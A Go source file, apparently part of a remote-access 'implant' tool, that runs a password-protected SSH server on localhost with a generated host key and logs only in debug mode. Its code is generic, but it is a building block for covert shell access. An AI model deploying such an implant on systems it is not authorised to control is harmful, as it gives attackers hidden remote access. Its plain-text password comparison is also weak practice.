package ssh

import (
	"go-implant/client/config"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"

	"golang.org/x/crypto/ssh"
)

// ServeSSH starts new ssh server on localhost:port
// authentication is done with username:password
func ServeSSH(stopchannel chan struct{}, port int, username string, password string, portchan chan (int)) {

	// In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed
	// in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing
	// net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn
	// into an ssh.ServerConn

	sshconfig := &ssh.ServerConfig{
		//Define a function to run when a client attempts a password login
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			// Should use constant-time compare (or better, salt+hash) in a production setting.
			if c.User() == username && string(pass) == password {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
		// You may also explicitly allow anonymous client authentication, though anon bash
		// sessions may not be a wise idea
		// NoClientAuth: true,
	}

	// generate ssh host key
	privateKey, err := generatePrivateKey(2048)
	if err != nil {
		if config.DEBUG {
			log.Print(err.Error())
		}
		return
	}

	private, err := ssh.NewSignerFromKey(privateKey)
	if err != nil {
		if config.DEBUG {
			log.Print(err.Error())
		}
		return
	}

	sshconfig.AddHostKey(private)

	// Once a ServerConfig has been configured, connections can be accepted.
	listener, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(port))
	if err != nil {
		if config.DEBUG {
			log.Printf("Failed to listen on %d (%s)", port, err)
		}
		return
	}

	// if port is dynamic (0), send the allocated port to channel
	if port == 0 {
		netarray := strings.Split(listener.Addr().String(), ":")
		chosenport, err := strconv.ParseUint(netarray[len(netarray)-1], 10, 64) // get the randomly chosen port as uint32
		if err != nil {
			log.Fatalf(err.Error())
		}
		portchan <- int(chosenport)
	}

	///////////////////////////
	// spawn goroutine to stop the server when stopchannel gets closed
	go func() {
		<-stopchannel
		listener.Close()
	}()
	///////////////////////////

	// Accept all connections
	if config.DEBUG {
		log.Printf("Listening on %d...", port)
	}
	for {
		tcpConn, err := listener.Accept()
		if err != nil {
			if config.DEBUG {
				log.Printf("Failed to accept incoming connection (%s)", err)
			}
			return
		}

		// Before use, a handshake must be performed on the incoming net.Conn.
		sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, sshconfig)
		if err != nil {
			if config.DEBUG {
				log.Printf("Failed to handshake (%s)", err)
			}
			continue
		}

		if config.DEBUG {
			log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
		}
		// Discard all global out-of-band Requests
		go ssh.DiscardRequests(reqs)
		// Accept all channels
		go handleChannels(chans)
	}
}

func handleChannels(chans <-chan ssh.NewChannel) {
	// Service the incoming Channel channel in go routine
	for newChannel := range chans {
		go handleChannel(newChannel)
	}
}

// generatePrivateKey creates a RSA Private Key of specified byte size
func generatePrivateKey(bitSize int) (*rsa.PrivateKey, error) {
	// Private Key generation
	privateKey, err := rsa.GenerateKey(rand.Reader, bitSize)
	if err != nil {
		return nil, err
	}

	// Validate Private Key
	err = privateKey.Validate()
	if err != nil {
		return nil, err
	}

	return privateKey, nil
}
